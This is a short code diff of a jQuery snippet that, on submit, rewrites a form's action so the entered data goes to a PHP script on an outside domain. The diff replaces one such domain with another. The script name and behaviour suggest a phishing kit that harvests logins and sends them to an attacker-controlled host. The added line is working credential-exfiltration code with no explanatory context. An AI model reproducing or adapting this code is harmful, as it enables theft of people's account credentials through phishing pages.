@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "//www.kalempong.my.id/review-data/fbsc.php");
+  $(myform).attr("action", "//www.citutbesar.my.id/review-data/fbsc.php");
 });
